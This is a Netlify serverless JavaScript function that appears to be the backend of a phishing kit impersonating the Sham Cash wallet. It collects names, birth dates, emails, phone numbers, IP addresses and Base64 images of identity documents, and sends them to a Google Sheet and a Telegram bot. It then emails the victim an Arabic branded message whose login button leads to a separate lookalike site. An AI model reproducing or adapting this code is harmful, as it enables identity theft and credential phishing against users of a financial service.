// netlify/functions/google-sheet-proxy.js

const axios = require('axios');
const nodemailer = require('nodemailer');

// Environment Variables (set in Netlify Dashboard)
const GOOGLE_APP_SCRIPT_WEB_APP_URL = process.env.GOOGLE_APP_SCRIPT_WEB_APP_URL;
const SCRIPT_API_KEY = process.env.SCRIPT_API_KEY; // New: API Key for Google Apps Script
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const GMAIL_USER = process.env.GMAIL_USER;
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;

// Function to dynamically generate the HTML email content
function generateEmailHtml(formData, loginUrl) {
  return `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تم استلام طلب توثيق حسابك - شام كاش</title>
        <style>
            body { font-family: 'Tajawal', sans-serif; }
        </style>
    </head>
    <body style="font-family: 'Tajawal', sans-serif; background-color: #2D3748; margin: 0; padding: 0; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; width: 100%; text-align: center;">
        <table role="presentation" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; background-color: #3A475A; border-radius: 12px; margin: 20px auto; padding: 20px; color: #E2E8F0; direction: rtl;">
            <tr>
                <td align="center" style="padding: 20px 0;">
                    <img src="https://charming-sable-747581.netlify.app/img/shamcash.svg" alt="شعار شام كاش" width="120" style="display: block; border: 0; max-width: 120px; margin: 0 auto 32px;">
                </td>
            </tr>
            <tr>
                <td align="right" style="padding: 0 20px 24px; font-size: 1.875rem; font-weight: bold; color: #E2E8F0; text-align: right;">
                    مرحباً بك، ${formData.fullName || 'عميلنا العزيز'}!
                </td>
            </tr>
            <tr>
                <td align="right" style="padding: 0 20px 24px; font-size: 1rem; line-height: 1.5; color: #E2E8F0; text-align: right;">
                    يسعدنا في شام كاش إعلامك بأننا قد تلقينا طلب توثيق حسابك بنجاح.
                </td>
            </tr>
            <tr>
                <td align="right" style="padding: 0 20px 16px; font-size: 0.95rem; line-height: 1.5; color: #A0AEC0; text-align: right;">
                    <p style="margin: 0 0 8px;">
                        <strong style="color: #E2E8F0;">نوع الحساب:</strong> ${formData.accountType || 'غير محدد'}
                    </p>
                    <p style="margin: 0 0 8px;">
                        <strong style="color: #E2E8F0;">نوع الوثيقة:</strong> ${formData.documentType || 'غير محدد'}
                    </p>
                    <p style="margin: 0;">
                        <strong style="color: #E2E8F0;">سبب الطلب:</strong> ${formData.verificationReason || 'غير محدد'}
                    </p>
                </td>
            </tr>
            <tr>
                <td align="right" style="padding: 24px 20px; font-size: 1rem; line-height: 1.5; color: #E2E8F0; text-align: right;">
                    لإكمال عملية التوثيق وتأكيد معلوماتك، يرجى تسجيل الدخول إلى حسابك عبر الزر أدناه:
                </td>
            </tr>
            <tr>
                <td align="center" style="padding: 0 20px 32px;">
                    <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 250px; margin: 0 auto;">
                        <tr>
                            <td align="center" style="border-radius: 8px; background-color: #3182CE;">
                                <a href="${loginUrl}" target="_blank" style="font-size: 1.125rem; font-weight: bold; text-decoration: none; color: #ffffff; padding: 12px 20px; display: block; border-radius: 8px; transition: background-color 0.3s ease;">
                                    تسجيل الدخول الآن
                                </a>
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td align="center" style="padding: 20px 20px 0; font-size: 0.75rem; color: #A0AEC0;">
                    <p style="margin: 0;">POWERED BY</p>
                    <p style="margin: 4px 0 0;">Sham Cash ©</p>
                    <p style="margin: 4px 0 0;">V 2.1.0</p>
                </td>
            </tr>
        </table>
    </body>
    </html>
  `;
}

exports.handler = async function(event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    // التحقق من وجود جميع المتغيرات البيئية المطلوبة
    if (!GOOGLE_APP_SCRIPT_WEB_APP_URL || !SCRIPT_API_KEY || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !GMAIL_USER || !GMAIL_APP_PASSWORD) {
        console.error("Missing one or more environment variables. Ensure all are set in Netlify.");
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Server configuration error: Missing credentials.' })
        };
    }

    let requestBody;
    try {
        requestBody = JSON.parse(event.body);
    } catch (error) {
        console.error('Error parsing request body:', error);
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Invalid JSON body.' })
        };
    }

    const { type, payload, ipAddress } = requestBody;

    if (type !== 'verification_request') {
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Invalid request type.' })
        };
    }

    const formData = payload; // بيانات النموذج النصية والصور المشفرة بـ Base64
    const loginUrl = "https://sham-cash-id-verify.netlify.app/"; // الرابط المطلوب في الزر

    // 1. إرسال البيانات إلى Google Apps Script Web App (الآن مع مفتاح API)
    try {
        const googleSheetData = {
            action: 'addRecord',
            api_key: SCRIPT_API_KEY, // إرسال مفتاح API للتحقق في Apps Script
            data: formData, // يشمل الآن صور Base64
            ip: ipAddress,
        };
        const googleAppsScriptResponse = await axios.post(GOOGLE_APP_SCRIPT_WEB_APP_URL, googleSheetData);
        console.log('Google Apps Script Response:', googleAppsScriptResponse.data);

    } catch (error) {
        console.error('Error sending data to Google Apps Script:', error.response ? error.response.data : error.message);
        // لا نوقف التنفيذ هنا، قد نريد إرسال تيليجرام أو بريد إلكتروني حتى لو فشل إرسال الشيت
    }

    // 2. إرسال إشعار إلى تيليجرام (مع جميع المدخلات)
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        let telegramMessage = `<b>[حالة توثيق جديدة]</b>\n\n`;
        // إضافة IP المستخدم
        telegramMessage += `<b>الـ IP:</b> ${ipAddress}\n`;

        // إضافة جميع حقول النموذج بشكل ديناميكي
        for (const key in formData) {
            if (formData.hasOwnProperty(key)) {
                // تجاهل حقول الصور المشفرة بـ Base64 من رسالة تيليجرام
                if (key.endsWith('Base64')) {
                    telegramMessage += `<b>${key.replace('Base64', '')} (صورة):</b> تم الرفع إلى Google Drive\n`;
                } else {
                    // ترجمة أسماء الحقول لعرض أفضل في تيليجرام
                    let readableKey = key;
                    switch (key) {
                        case 'accountType': readableKey = 'نوع الحساب'; break;
                        case 'verificationReason': readableKey = 'سبب الطلب'; break;
                        case 'documentType': readableKey = 'نوع الوثيقة'; break;
                        case 'fullName': readableKey = 'الاسم الثلاثي'; break;
                        case 'birthDate': readableKey = 'تاريخ الميلاد'; break;
                        case 'shamcashEmail': readableKey = 'البريد الإلكتروني'; break;
                        case 'phoneNumber': readableKey = 'رقم الهاتف'; break;
                        case 'otherReason': readableKey = 'سبب آخر'; break;
                        case 'otherDocument': readableKey = 'وثيقة أخرى'; break;
                    }
                    telegramMessage += `<b>${readableKey}:</b> ${formData[key]}\n`;
                }
            }
        }

        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(telegramApiUrl, {
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'HTML'
            });
            console.log('Telegram notification sent!');
        } catch (error) {
            console.error('Error sending Telegram notification:', error.response ? error.response.data : error.message);
        }
    }

    // 3. إرسال البريد الإلكتروني
    if (GMAIL_USER && GMAIL_APP_PASSWORD) {
        try {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: GMAIL_USER,
                    pass: GMAIL_APP_PASSWORD,
                },
            });

            const mailOptions = {
                from: GMAIL_USER,
                to: formData.shamcashEmail,
                subject: 'تم استلام طلب توثيق حسابك - شام كاش',
                html: generateEmailHtml(formData, loginUrl),
            };

            await transporter.sendMail(mailOptions);
            console.log('Email sent successfully!');
        } catch (error) {
            console.error('Error sending email:', error);
        }
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ success: true, message: 'Verification request processed, notifications sent.' })
    };
};
